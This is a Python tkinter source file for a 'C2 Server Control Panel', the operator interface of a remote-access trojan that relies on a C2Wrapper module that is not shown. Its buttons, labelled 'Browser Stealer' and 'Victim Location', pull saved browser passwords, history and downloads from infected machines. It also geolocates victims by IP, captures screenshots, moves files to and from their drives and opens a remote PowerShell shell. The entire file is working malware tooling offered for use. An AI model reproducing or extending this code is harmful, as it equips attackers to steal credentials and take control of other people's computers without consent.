import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog
import threading
import io
import csv
import time
from pathlib import Path
from PIL import Image, ImageTk
import sv_ttk
from pathlib import PureWindowsPath


# Import the wrapper module
try:
    from wrapper import C2Wrapper   
    WRAPPER_LOADED = True
except ImportError as e:
    print(f"[ERR] Could not import C2Wrapper: {e}")
    WRAPPER_LOADED = False

C2_PORT = 3000  # Default port
CONNECTIONS_FILE = Path(__file__).parent / 'connections.txt'

class DirectoryBrowser:
    """Directory browser window for navigating remote file system"""
    
    def __init__(self, parent, c2_wrapper, initial_path="C:\\", mode="download"):
        """
        Args:
            parent: Parent window
            c2_wrapper: C2Wrapper instance
            initial_path: Starting directory path
            mode: 'download' or 'upload'
        """
        self.parent = parent
        self.c2 = c2_wrapper
        self.current_path = initial_path
        self.mode = mode
        self.selected_file = None
        
        # Create browser window
        self.window = tk.Toplevel(parent)
        self.window.title(f"Remote Directory Browser - {mode.capitalize()}")
        self.window.geometry("800x600")
        self.window.transient(parent)
        self.window.grab_set()
        
        self._setup_ui()
        self._load_directory(initial_path)
        
    def _setup_ui(self):
        main_frame = ttk.Frame(self.window, padding=10)
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Path navigation bar
        nav_frame = ttk.Frame(main_frame)
        nav_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(nav_frame, text="Path:", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=(0, 5))
        
        self.path_entry = ttk.Entry(nav_frame, font=("Consolas", 10))
        self.path_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.path_entry.bind('<Return>', lambda e: self._load_directory(self.path_entry.get()))
        
        ttk.Button(
            nav_frame,
            text="Go",
            command=lambda: self._load_directory(self.path_entry.get()),
            width=8
        ).pack(side=tk.LEFT)
        
        # Directory content table
        table_frame = ttk.Frame(main_frame)
        table_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        # Create treeview
        self.tree = ttk.Treeview(table_frame, columns=("Type", "Name", "Modified"), show="headings")
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Configure columns
        self.tree.heading("Type", text="Type")
        self.tree.heading("Name", text="Name")
        self.tree.heading("Modified", text="Modified")
        
        self.tree.column("Type", width=80, anchor="center")
        self.tree.column("Name", width=400, anchor="w")
        self.tree.column("Modified", width=180, anchor="center")
        
        # Scrollbars
        scrollbar_y = ttk.Scrollbar(table_frame, orient="vertical", command=self.tree.yview)
        scrollbar_y.pack(side=tk.RIGHT, fill=tk.Y)
        self.tree.configure(yscrollcommand=scrollbar_y.set)
        
        # Bind double-click
        self.tree.bind("<Double-1>", self._on_double_click)
        
        # Alternate row colors
        self.tree.tag_configure("folder", background="#2a4a6a")
        self.tree.tag_configure("file", background="#1d1d1d")
        self.tree.tag_configure("parent", background="#3a3a3a")
        
        # Button frame
        btn_frame = ttk.Frame(main_frame)
        btn_frame.pack(fill=tk.X)
        
        if self.mode == "download":
            ttk.Button(
                btn_frame,
                text="Download",
                command=self._download_selected,
                width=25
            ).pack(side=tk.LEFT, padx=5)
        else:  # upload mode
            ttk.Button(
                btn_frame,
                text="Upload",
                command=self._upload_here,
                width=25
            ).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(
            btn_frame,
            text="Refresh",
            command=lambda: self._load_directory(self.current_path),
            width=15
        ).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(
            btn_frame,
            text="Cancel",
            command=self.window.destroy,
            width=15
        ).pack(side=tk.LEFT, padx=5)
        
    def _load_directory(self, path):
        """Load directory contents from remote machine"""
        try:
            self.window.update()
            
            # Get directory content
            csv_data = self.c2.get_content_from_dir(path)
            
            # Clear existing items
            for item in self.tree.get_children():
                self.tree.delete(item)
            
            # Parse CSV
            reader = csv.DictReader(io.StringIO(csv_data))
            rows = list(reader)
            
            if not rows:
                self.current_path = path
                self.path_entry.delete(0, tk.END)
                self.path_entry.insert(0, path)
                return
            
            # Add parent directory entry (..)
            parent_path = str(Path(path).parent)
            if path != parent_path:  # Don't add .. at root
                self.tree.insert("", 0, values=("folder", "..", ""), tags=("parent",))
            
            # Add folders first, then files
            folders = [row for row in rows if row.get("type", "").lower() == "folder"]
            files = [row for row in rows if row.get("type", "").lower() == "file"]
            
            for folder in folders:
                name = folder.get("name", "")
                modified = folder.get("modified", "")
                self.tree.insert("", tk.END, values=("Folder", name, modified), tags=("folder",))
            
            for file in files:
                name = file.get("name", "")
                modified = file.get("modified", "")
                self.tree.insert("", tk.END, values=("File", name, modified), tags=("file",))
            
            self.current_path = path
            self.path_entry.delete(0, tk.END)
            self.path_entry.insert(0, path)
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load directory:\n{e}")
    
    def _on_double_click(self, event):
        """Handle double-click on tree item"""
        selection = self.tree.selection()
        if not selection:
            return
        
        item = selection[0]
        values = self.tree.item(item, "values")
        
        if not values:
            return
        
        item_type = values[0]
        item_name = values[1]
        
        # Handle parent directory (..)
        if item_name == "..":
            p = PureWindowsPath(self.current_path) # Cross platform moment
            parent_path = str(p.parent)
            self._load_directory(parent_path)
            return
        
        # Handle folder navigation
        if "Folder" in item_type or item_type.lower() == "folder":
            # Construct new path
            if self.current_path.endswith("\\"):
                new_path = self.current_path + item_name
            else:
                new_path = self.current_path + "\\" + item_name
            self._load_directory(new_path)
        
        # Handle file selection (download mode)
        elif self.mode == "download" and ("File" in item_type or item_type.lower() == "file"):
            if self.current_path.endswith("\\"):
                remote_file = self.current_path + item_name
            else:
                remote_file = self.current_path + "\\" + item_name
            self._download_file(remote_file, item_name)
    
    def _download_file(self, remote_path, filename):
        """Download a specific file"""
        try:
            local_path = Path.cwd() / filename
            
            # If file exists, add number suffix
            counter = 1
            original_name = local_path.stem
            extension = local_path.suffix
            while local_path.exists():
                local_path = Path.cwd() / f"{original_name}_{counter}{extension}"
                counter += 1
            
            self.window.update()
            
            self.c2.download_file(remote_path, str(local_path))
            
            if local_path.exists():
                file_size = local_path.stat().st_size
                messagebox.showinfo(
                    "Success",
                    f"File downloaded successfully!\n\n"
                    f"Saved to: {local_path}\n"
                    f"Size: {file_size} bytes"
                )
            else:
                raise Exception("Download completed but file not found")
                
        except Exception as e:
            messagebox.showerror("Download Failed", f"Failed to download file:\n{e}")
    
    def _download_selected(self):
        """Download currently selected file"""
        selection = self.tree.selection()
        if not selection:
            messagebox.showwarning("No Selection", "Please select a file to download")
            return
        
        item = selection[0]
        values = self.tree.item(item, "values")
        
        if not values:
            return
        
        item_type = values[0]
        item_name = values[1]
        
        if "Folder" in item_type or item_type.lower() == "folder":
            messagebox.showwarning("Invalid Selection", "Please select a file, not a folder")
            return
        
        if item_name == "..":
            messagebox.showwarning("Invalid Selection", "Please select a file")
            return
        
        if self.current_path.endswith("\\"):
            remote_file = self.current_path + item_name
        else:
            remote_file = self.current_path + "\\" + item_name
        
        self._download_file(remote_file, item_name)
    
    def _upload_here(self):
        """Upload file to current directory"""
        local_path = filedialog.askopenfilename(
            title="Select file to upload",
            parent=self.window
        )
        
        if not local_path:
            return
        
        filename = Path(local_path).name
        
        if self.current_path.endswith("\\"):
            remote_path = self.current_path + filename
        else:
            remote_path = self.current_path + "\\" + filename
        
        try:
            self.window.update()  
            self.c2.upload_file(local_path, remote_path)
            file_size = Path(local_path).stat().st_size
            
            messagebox.showinfo(
                "Success",
                f"File uploaded successfully!\n\n"
                f"Remote path: {remote_path}\n"
                f"Size: {file_size} bytes"
            )
            
            # Refresh directory view
            self._load_directory(self.current_path)
            
        except Exception as e:
            messagebox.showerror("Upload Failed", f"Failed to upload file:\n{e}")

class C2ServerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("C2 Server Control Panel")
        self.root.geometry("900x1000")
        
        self.c2 = None
        self.connected = False
        
        if not WRAPPER_LOADED:
            messagebox.showerror(
                "Error", 
                "Failed to load C2Wrapper module"
            )
        
        self.setup_ui()
        
        if WRAPPER_LOADED:
            self.root.after(100, self.start_server)
        
    def setup_ui(self):
        # Main container with padding
        main_container = ttk.Frame(self.root, padding=10)
        main_container.pack(fill=tk.BOTH, expand=True)
        
        # Status frame
        status_frame = ttk.LabelFrame(main_container, text="Server Status", padding=15)
        status_frame.pack(fill=tk.X, pady=(0, 10))
        
        status_inner = ttk.Frame(status_frame)
        status_inner.pack(fill=tk.X)
        
        ttk.Label(status_inner, text="Status:", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=(0, 10))
        self.status_label = ttk.Label(
            status_inner, 
            text="Not Connected", 
            foreground="red", 
            font=("Arial", 11, "bold")
        )
        self.status_label.pack(side=tk.LEFT)
        
        self.client_info_label = ttk.Label(
            status_frame, 
            text="", 
            foreground="#4A9EFF",
            font=("Arial", 9)
        )
        self.client_info_label.pack(pady=(5, 0))
        
        # Connection control frame
        conn_frame = ttk.LabelFrame(main_container, text="Connection Control", padding=10)
        conn_frame.pack(fill=tk.X, pady=(0, 10))
        
        btn_container = ttk.Frame(conn_frame)
        btn_container.pack()
        
        self.start_btn = ttk.Button(
            btn_container, 
            text="▶ Start Server", 
            command=self.start_server,
            width=20
        )
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = ttk.Button(
            btn_container, 
            text="⬛ Stop Server", 
            command=self.stop_server, 
            state=tk.DISABLED,
            width=20
        )
        self.stop_btn.pack(side=tk.LEFT, padx=5)

        # Client selector
        self.client_combo = ttk.Combobox(btn_container, values=[], width=30, state='readonly')
        self.client_combo.pack(side=tk.LEFT, padx=(10,5))

        ttk.Button(btn_container, text="Select", command=self.select_client, width=5).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_container, text="Refresh", command=self.refresh_clients, width=5).pack(side=tk.LEFT, padx=5)
        
        # Command buttons frame with 2x2 grid
        cmd_frame = ttk.LabelFrame(main_container, text="Available Commands", padding=15)
        cmd_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        # Define command groups
        command_groups = [
            {
                "title": "Info Gatherer",
                "commands": [
                    {"text": "System info", "desc": "Show system information", 
                     "command": self.show_system_info, "var_name": "system_info_btn"},
                    {"text": "Location", "desc": "Show geographical location on map", 
                     "command": self.show_victim_location, "var_name": "location_btn"}
                ]
            },
            {
                "title": "Browser Stealer",
                "commands": [
                    {"text": "Browser Passwords", "desc": "Extract saved passwords", 
                     "command": self.get_browser_passwords, "var_name": "browser_pass_btn"},
                    {"text": "Browser History", "desc": "Extract browsing history", 
                     "command": self.get_browser_history, "var_name": "browser_history_btn"},
                    {"text": "Browser Downloads", "desc": "Extract download history", 
                     "command": self.get_browser_downloads, "var_name": "browser_dl_btn"}
                ]
            },
            {
                "title": "File Browsing",
                "commands": [
                    {"text": "Download File", "desc": "Browse and download files", 
                     "command": self.download_file, "var_name": "download_btn"},
                    {"text": "Upload File", "desc": "Browse and upload files", 
                     "command": self.upload_file, "var_name": "upload_btn"}
                ]
            },
            {
                "title": "Others",
                "commands": [
                    {"text": "Take Screenshot", "desc": "Capture screen", 
                     "command": self.take_screenshot, "var_name": "screenshot_btn"},
                    {"text": "Shell", "desc": "PowerShell/CMD terminal", 
                     "command": self.start_powershell, "var_name": "psh_btn"}
                ]
            }
        ]
        
        # Create 2x2 grid
        for i, group in enumerate(command_groups):
            row = i // 2
            col = i % 2
            
            # Group frame
            group_frame = ttk.LabelFrame(cmd_frame, text=group["title"], padding=10)
            group_frame.grid(row=row, column=col, sticky="nsew", padx=5, pady=5)
            
            # Add commands to group
            for cmd_info in group["commands"]:
                cmd_container = ttk.Frame(group_frame)
                cmd_container.pack(fill=tk.X, pady=5)
                
                btn = ttk.Button(
                    cmd_container,
                    text=cmd_info["text"],
                    command=cmd_info["command"],
                    width=25,
                    state=tk.DISABLED
                )
                btn.pack(fill=tk.X, pady=(0, 2))
                setattr(self, cmd_info["var_name"], btn)
                
                desc_label = ttk.Label(
                    cmd_container,
                    text=cmd_info["desc"],
                    font=("Arial", 8),
                    foreground="gray"
                )
                desc_label.pack(fill=tk.X)
        
        # Configure grid weights for equal sizing
        cmd_frame.grid_rowconfigure(0, weight=1)
        cmd_frame.grid_rowconfigure(1, weight=1)
        cmd_frame.grid_columnconfigure(0, weight=1)
        cmd_frame.grid_columnconfigure(1, weight=1)
        
        # Log frame
        log_frame = ttk.LabelFrame(main_container, text="Activity Log", padding=10)
        log_frame.pack(fill=tk.BOTH, expand=True)
        
        self.log_text = scrolledtext.ScrolledText(
            log_frame, 
            height=12,
            state=tk.DISABLED, 
            wrap=tk.WORD,
            font=("Consolas", 9)
        )
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        self.log_text.tag_config("info", foreground="#4A9EFF")
        self.log_text.tag_config("success", foreground="#50C878")
        self.log_text.tag_config("error", foreground="#FF6B6B")

    def show_victim_location(self):
        # get public ip
        victim_ip = None
        res = self.c2.get_client_info()
        for line in res.splitlines():
            if line.startswith("Public IP"):
                victim_ip = line.split(":", 1)[1].strip()
        

        # Create loading window
        loading_win = tk.Toplevel(self.root)
        loading_win.title("Locating Victim...")
        loading_win.geometry("300x100")
        loading_win.transient(self.root)
        loading_win.grab_set()
        ttk.Label(loading_win, text=f"Resolving location for:\n{victim_ip}", font=("Arial", 10)).pack(pady=20)
        ttk.Progressbar(loading_win, mode='indeterminate').pack(pady=10, fill=tk.X, padx=20)
        loading_win.update()
        
        def geolocate_and_show():
            try:
                import requests
                from tkintermapview import TkinterMapView

                url = f"https://ipwhois.app/json/{victim_ip}"
                response = requests.get(url, timeout=10)
                data = response.json()

                if not data.get("success", True):
                    raise Exception(data.get("message", "Unknown error"))

                latitude = data.get("latitude")
                longitude = data.get("longitude")
                city = data.get("city", "Unknown City")
                region = data.get("region", "")
                country = data.get("country", "Unknown Country")
                org = data.get("org", "")
                isp = data.get("isp", "")


                if not latitude or not longitude:
                    raise Exception("Location data not available")

                # Close loading window
                self.root.after(0, loading_win.destroy)

                # Create map window
                map_window = tk.Toplevel(self.root)
                map_window.title(f"Victim Location - {victim_ip}")
                map_window.geometry("1000x700")
                map_window.minsize(800, 600)

                # Header info
                header_frame = ttk.Frame(map_window)
                header_frame.pack(fill=tk.X, padx=10, pady=10)

                info_text = f"IP: {victim_ip}  |  {city}, {region}, {country}  |  ISP: {org or isp}"
                ttk.Label(header_frame, text=info_text, font=("Segoe UI", 11, "bold"), foreground="#2c3e50").pack()

                accuracy = "± ~50–100 km (IP-based geolocation)"
                ttk.Label(header_frame, text=accuracy, font=("Arial", 9), foreground="gray").pack(pady=(2,0))

                # Map widget
                map_widget = TkinterMapView(map_window, width=980, height=600, corner_radius=10)
                map_widget.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0,10))

                # Set map type and position
                map_widget.set_tile_server("https://a.tile.openstreetmap.org/{z}/{x}/{y}.png", max_zoom=22)
                map_widget.set_position(latitude, longitude)
                map_widget.set_zoom(13)
                map_widget.set_marker(latitude, longitude, text=f"Victim Location\n{city}, {country}")

                self.log(f"Geolocation success: {city}, {country} ({latitude}, {longitude})", "success")

            except Exception as e:
                self.root.after(0, loading_win.destroy)
                messagebox.showerror("Geolocation Failed", f"Could not determine location:\n\n{str(e)}")
                self.log(f"Geolocation failed for {victim_ip}: {e}", "error")

        threading.Thread(target=geolocate_and_show, daemon=True).start()

    def show_system_info(self):
        try:
            info = self.c2.get_client_info()
            
            if info:
                self.log("System info retrieved", "success")
                
                # Create window
                info_window = tk.Toplevel(self.root)
                info_window.title("System Information")
                info_window.geometry("600x400")
                
                # Create scrolled text widget
                text_widget = scrolledtext.ScrolledText(
                    info_window,
                    wrap=tk.WORD,
                    font=("Consolas", 10),
                    padx=10,
                    pady=10
                )
                text_widget.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

                
                text_widget.insert("1.0", info)
                text_widget.config(state=tk.DISABLED)
                
            else:
                self.log("No system info found", "info")
                messagebox.showinfo("No system info found", "No system info found")
                
        except Exception as e:
            self.log(f"System info error: {e}", "error")
            messagebox.showerror("Error", f"Failed to retrieve system info:\n{e}")

    def get_browser_passwords(self):
        try:
            self.log("Retrieving browser passwords...", "info")
            passwords = self.c2.get_browser_password()
            
            if passwords:
                self._show_text_window("Browser Passwords", passwords)
                self.log("Browser passwords retrieved", "success")
            else:
                self.log("No browser passwords found", "info")
                messagebox.showinfo("Browser Passwords", "No saved passwords found")
                
        except Exception as e:
            self.log(f"Browser passwords error: {e}", "error")
            messagebox.showerror("Error", f"Failed to retrieve browser passwords:\n{e}")

    def get_browser_history(self):
        try:
            self.log("Retrieving browser history...", "info")
            history = self.c2.get_browser_history()
            
            if history:
                self._show_text_window("Browser History", history)
                self.log("Browser history retrieved", "success")
            else:
                self.log("No browser history found", "info")
                messagebox.showinfo("Browser History", "No browsing history found")
                
        except Exception as e:
            self.log(f"Browser history error: {e}", "error")
            messagebox.showerror("Error", f"Failed to retrieve browser history:\n{e}")

    def get_browser_downloads(self):
        try:
            self.log("Retrieving browser downloads...", "info")
            downloads = self.c2.get_browser_downloads()
            
            if downloads:
                self._show_text_window("Browser Downloads", downloads)
                self.log("Browser downloads retrieved", "success")
            else:
                self.log("No browser downloads found", "info")
                messagebox.showinfo("Browser Downloads", "No download history found")
                
        except Exception as e:
            self.log(f"Browser downloads error: {e}", "error")
            messagebox.showerror("Error", f"Failed to retrieve browser downloads:\n{e}")

    def _show_text_window(self, title, content):
        """Display CSV content in a table viewer window"""
        text_window = tk.Toplevel(self.root)
        text_window.title(title)
        text_window.geometry("900x600")

        main_frame = ttk.Frame(text_window, padding=10)
        main_frame.pack(fill=tk.BOTH, expand=True)

        # Header
        header_frame = ttk.Frame(main_frame)
        header_frame.pack(fill=tk.X, pady=(0, 10))

        ttk.Label(
            header_frame,
            text=title,
            font=("Arial", 12, "bold")
        ).pack(side=tk.LEFT)

        # --- CSV TABLE ---
        table_frame = ttk.Frame(main_frame)
        table_frame.pack(fill=tk.BOTH, expand=True)

        tree = ttk.Treeview(table_frame, show="headings")
        tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        scrollbar_y = ttk.Scrollbar(table_frame, orient="vertical", command=tree.yview)
        scrollbar_y.pack(side=tk.RIGHT, fill=tk.Y)

        scrollbar_x = ttk.Scrollbar(main_frame, orient="horizontal", command=tree.xview)
        scrollbar_x.pack(fill=tk.X, pady=(5, 10))

        tree.configure(yscrollcommand=scrollbar_y.set, xscrollcommand=scrollbar_x.set)

        # Parse CSV
        reader = csv.reader(io.StringIO(content))
        rows = list(reader)
        if not rows:
            messagebox.showerror("CSV Error", "CSV content is empty.")
            return

        headers = rows[0]
        tree["columns"] = headers

        # Setup columns
        for h in headers:
            tree.heading(h, text=h)
            tree.column(h, width=120, anchor="center")

        # Add rows with alternating color tags
        for idx, row in enumerate(rows[1:]):
            tag = "even" if idx % 2 == 0 else "odd"
            tree.insert("", tk.END, values=row, tags=(tag,))

        tree.tag_configure("even", background="#1d1d1d")
        tree.tag_configure("odd", background="#272727")

        # --- BUTTONS ---
        btn_frame = ttk.Frame(main_frame)
        btn_frame.pack(fill=tk.X)

        def copy_to_clipboard():
            text_window.clipboard_clear()
            text_window.clipboard_append(content)
            messagebox.showinfo("Copied", "CSV copied to clipboard")

        ttk.Button(
            btn_frame,
            text="📋 Copy to Clipboard",
            command=copy_to_clipboard,
            width=20
        ).pack(side=tk.LEFT, padx=5)

        ttk.Button(
            btn_frame,
            text="✖ Close",
            command=text_window.destroy,
            width=20
        ).pack(side=tk.LEFT, padx=5)
            
    def log(self, message, level="info"):
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, message + "\n", level)
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)
        
    def start_server(self):            
        self.start_btn.config(state=tk.DISABLED)
        
        try:
            self.c2 = C2Wrapper()
            
            self.log(f"Listening on 0.0.0.0:{C2_PORT}")
            self.status_label.config(text="Waiting for connection...", foreground="orange")
            self.root.update()
            
            # start listening in background
            self.c2.setup()
            self.stop_btn.config(state=tk.NORMAL)

            # start background thread to accept incoming clients
            # clients: ip -> {'fd': int or None, 'online': bool}
            self.clients = {}

            try:
                if CONNECTIONS_FILE.exists():
                    with open(CONNECTIONS_FILE, 'r') as f:
                        for line in f:
                            ip = line.strip()
                            if not ip:
                                continue
                            # store entries with no fd and offline by default
                            self.clients[ip] = {'fd': None, 'online': False}

                # populate combobox with ip (offline) labels
                vals = [f"{ip} ({'online' if info.get('online') else 'offline'})" for ip, info in self.clients.items()]
                if vals:
                    self.client_combo['values'] = vals
                    self.client_combo.set('')
            except Exception:
                pass

            def accept_loop():
                while True:
                    try:
                        fd = self.c2.accept_client()
                        if fd and fd > 0:
                            ip = self.c2.get_peer_ip(fd)

                            # update GUI from main thread
                            def add_cb(ip=ip, fd=fd):
                                # update mapping: set fd and mark online
                                existing = self.clients.get(ip, {})
                                existing['fd'] = fd
                                existing['online'] = True
                                self.clients[ip] = existing

                                # rebuild combobox labels
                                vals = [f"{i} ({'online' if inf.get('online') else 'offline'})" for i, inf in self.clients.items()]
                                self.client_combo['values'] = vals
                                self._persist_connections()
                                self.log(f"Client connected: {ip}", "success")

                            self.root.after(0, add_cb)
                    except Exception:
                        # small delay to avoid busy loop if error occurs
                        time.sleep(0.5)

            threading.Thread(target=accept_loop, daemon=True).start()

            self.log("Server started (listening). Waiting for clients...", "info")
            
        except Exception as e:
            self.log(f"Server error: {e}", "error")
            self.start_btn.config(state=tk.NORMAL)
            self.status_label.config(text="Connection Failed", foreground="red")
            
    def _enable_commands(self):
        """Enable all command buttons"""
        self.psh_btn.config(state=tk.NORMAL)
        self.screenshot_btn.config(state=tk.NORMAL)
        self.download_btn.config(state=tk.NORMAL)
        self.upload_btn.config(state=tk.NORMAL)
        self.location_btn.config(state=tk.NORMAL)
        self.browser_pass_btn.config(state=tk.NORMAL)
        self.browser_history_btn.config(state=tk.NORMAL)
        self.browser_dl_btn.config(state=tk.NORMAL)
        self.system_info_btn.config(state=tk.NORMAL)
             
    def _disable_commands(self):
        """Disable all command buttons"""
        self.psh_btn.config(state=tk.DISABLED)
        self.screenshot_btn.config(state=tk.DISABLED)
        self.download_btn.config(state=tk.DISABLED)
        self.upload_btn.config(state=tk.DISABLED)
        self.location_btn.config(state=tk.DISABLED)
        self.browser_pass_btn.config(state=tk.DISABLED)
        self.browser_history_btn.config(state=tk.DISABLED)
        self.browser_dl_btn.config(state=tk.DISABLED)
        self.system_info_btn.config(state=tk.DISABLED)
              
    def stop_server(self):
        try:
            self.c2.stop_listen()
        except Exception:
            pass
        self.log("Server stopped")
        # close all accepted clients
        try:
            for ip, info in getattr(self, 'clients', {}).items():
                try:
                    fd = info.get('fd') if isinstance(info, dict) else info
                    if fd:
                        self.c2.close_client(fd)
                except Exception:
                    pass
        except Exception:
            pass
        self.c2 = None
                
        self.connected = False
        self.status_label.config(text="Disconnected", foreground="red")
        self.client_info_label.config(text="")
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self._disable_commands()
        self.client_combo['values'] = []
        self.client_combo.set('')

    def select_client(self):
        sel = self.client_combo.get()
        if not sel:
            messagebox.showerror("Error", "No client selected")
            return
        # sel format: 'ip (status)'
        ip = sel.split(' ')[0]
        info = self.clients.get(ip)
        if not info:
            messagebox.showerror("Error", "Selected client not found")
            return

        fd = info.get('fd')
        if not fd:
            messagebox.showerror("Error", "Selected client is offline")
            return

        # assign client fd to wrapper so existing methods work
        self.c2.client_fd = fd

        # fetch client info and enable commands
        try:
            client_info = self.c2.get_client_info()
            if client_info:
                self.log(client_info, "info")
                first_line = client_info.split('\n')[0][:70]
                self.client_info_label.config(text=first_line)
                self.client_info = client_info
        except Exception:
            pass

        self.connected = True
        self.status_label.config(text=f"Connected ({ip})", foreground="green")
        self._enable_commands()

    def _persist_connections(self):
        try:
            # persist only IPs (one per line). Online state and fds are runtime-only.
            with open(CONNECTIONS_FILE, 'w') as f:
                for ip in self.clients.keys():
                    f.write(f"{ip}\n")
        except Exception:
            pass

    def refresh_clients(self):
        """Refresh client online/offline status and update UI/persistence."""
        try:
            vals = []
            # Save current selected wrapper client_fd and restore later
            prev_fd = getattr(self.c2, 'client_fd', None)

            for ip, info in list(self.clients.items()):
                fd = info.get('fd')
                online = False

                # If we have an fd for this ip, try to request system info to verify online
                if fd:
                    try:
                        # Temporarily set client_fd for the check and call get_client_info
                        self.c2.client_fd = fd
                        res = self.c2.get_client_info()
                        if res and res.strip():
                            online = True
                    except Exception:
                        online = False

                # If we failed to verify the client, clear stored fd to avoid stale fds
                if not online and fd:
                    self.clients[ip]['fd'] = None

                self.clients[ip]['online'] = online
                vals.append(f"{ip} ({'online' if online else 'offline'})")

            # restore previous client fd
            try:
                self.c2.client_fd = prev_fd
            except Exception:
                pass
            cur = self.client_combo.get()
            self.client_combo['values'] = vals
            if cur in vals:
                self.client_combo.set(cur)
            self._persist_connections()
        except Exception:
            pass
        
    def start_powershell(self):
        # Open an internal non-blocking shell window that sends commands via psh_command
        if not self.connected or not self.c2:
            messagebox.showerror("Error", "Not connected to any client")
            return

        shell_win = tk.Toplevel(self.root)
        shell_win.title("Remote Shell")
        shell_win.geometry("900x600")
        shell_win.transient(self.root)

        # Output display
        out_frame = ttk.Frame(shell_win, padding=8)
        out_frame.pack(fill=tk.BOTH, expand=True)

        out_text = scrolledtext.ScrolledText(
            out_frame, height=25, state=tk.DISABLED, wrap=tk.WORD, font=("Consolas", 10)
        )
        out_text.pack(fill=tk.BOTH, expand=True)

        # Input frame
        input_frame = ttk.Frame(shell_win, padding=8)
        input_frame.pack(fill=tk.X)

        cmd_entry = ttk.Entry(input_frame, font=("Consolas", 10))
        cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 8))

        def append_output(text, tag=None):
            out_text.config(state=tk.NORMAL)
            out_text.insert(tk.END, text + "\n")
            if tag:
                out_text.tag_add(tag, f"end-{len(text)+1}c", tk.END)
            out_text.see(tk.END)
            out_text.config(state=tk.DISABLED)

        def send_cmd(_=None):
            cmd = cmd_entry.get().strip()
            if not cmd:
                return

            # Show the command in output
            append_output(f"> {cmd}", "info")
            cmd_entry.delete(0, tk.END)

            def do_send():
                try:
                    output = self.c2.psh_command(cmd)
                    if output is None:
                        output = ""
                    # Ensure output is string
                    output = str(output)
                    self.root.after(0, lambda: append_output(output))
                except Exception as e:
                    self.root.after(0, lambda: append_output(f"Shell error: {e}", "error"))

            threading.Thread(target=do_send, daemon=True).start()

        cmd_entry.bind('<Return>', send_cmd)

        ttk.Button(input_frame, text="Send", command=send_cmd, width=12).pack(side=tk.LEFT)
        ttk.Button(input_frame, text="Close", command=shell_win.destroy, width=12).pack(side=tk.LEFT, padx=(8,0))

        self.log("Remote shell opened", "success")
            
    def take_screenshot(self):
        try:
            self.c2.take_screenshot()
            
            screenshot_files = sorted(
                Path('.').glob('screenshot_*.bmp'),
                key=lambda p: p.stat().st_mtime,
                reverse=True
            )
            
            if screenshot_files:
                latest_screenshot = screenshot_files[0]
                self.log(f"Screenshot saved: {latest_screenshot.name}", "success")
                
                with open(latest_screenshot, 'rb') as f:
                    img_data = f.read()
                    self._show_screenshot(img_data, str(latest_screenshot))
                
        except Exception as e:
            self.log(f"Screenshot error: {e}", "error")
            
    def _show_screenshot(self, img_data, filename):
        """Display screenshot in new window"""
        screenshot_window = tk.Toplevel(self.root)
        screenshot_window.title(f"Screenshot Preview - {filename}")
        screenshot_window.geometry("1100x800")
        
        try:
            img = Image.open(io.BytesIO(img_data))
            original_size = img.size
            
            max_size = (1050, 650)
            img.thumbnail(max_size, Image.Resampling.LANCZOS)
            
            photo = ImageTk.PhotoImage(img)
            
            main_frame = ttk.Frame(screenshot_window, padding=10)
            main_frame.pack(fill=tk.BOTH, expand=True)
            
            info_frame = ttk.Frame(main_frame)
            info_frame.pack(fill=tk.X, pady=(0, 10))
            
            info_text = f"Original size: {original_size[0]}x{original_size[1]} | File: {filename}"
            ttk.Label(info_frame, text=info_text, font=("Arial", 9)).pack()
            
            img_frame = ttk.Frame(main_frame)
            img_frame.pack(fill=tk.BOTH, expand=True)
            
            canvas = tk.Canvas(img_frame, bg='#2b2b2b')
            scrollbar_y = ttk.Scrollbar(img_frame, orient=tk.VERTICAL, command=canvas.yview)
            scrollbar_x = ttk.Scrollbar(img_frame, orient=tk.HORIZONTAL, command=canvas.xview)
            
            canvas.configure(yscrollcommand=scrollbar_y.set, xscrollcommand=scrollbar_x.set)
            
            scrollbar_y.pack(side=tk.RIGHT, fill=tk.Y)
            scrollbar_x.pack(side=tk.BOTTOM, fill=tk.X)
            canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
            
            canvas.create_image(0, 0, anchor=tk.NW, image=photo)
            canvas.image = photo
            canvas.config(scrollregion=canvas.bbox(tk.ALL))
            
            btn_frame = ttk.Frame(main_frame)
            btn_frame.pack(fill=tk.X, pady=(10, 0))
            
            close_btn = ttk.Button(btn_frame, text="✖ Close", command=screenshot_window.destroy, width=20)
            close_btn.pack(side=tk.LEFT, padx=5)
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to display screenshot:\n{e}")
            screenshot_window.destroy()
            self.log(f"Display error: {e}", "error")
            
    def download_file(self):
        """Open directory browser for downloading files"""
        try:
            self.log("Opening remote directory browser...", "info")
            DirectoryBrowser(self.root, self.c2, initial_path="C:\\", mode="download")
        except Exception as e:
            self.log(f"Browser error: {e}", "error")
            messagebox.showerror("Error", f"Failed to open directory browser:\n{e}")
            
    def upload_file(self):
        """Open directory browser for uploading files"""
        try:
            self.log("Opening remote directory browser...", "info")
            DirectoryBrowser(self.root, self.c2, initial_path="C:\\", mode="upload")
        except Exception as e:
            self.log(f"Browser error: {e}", "error")
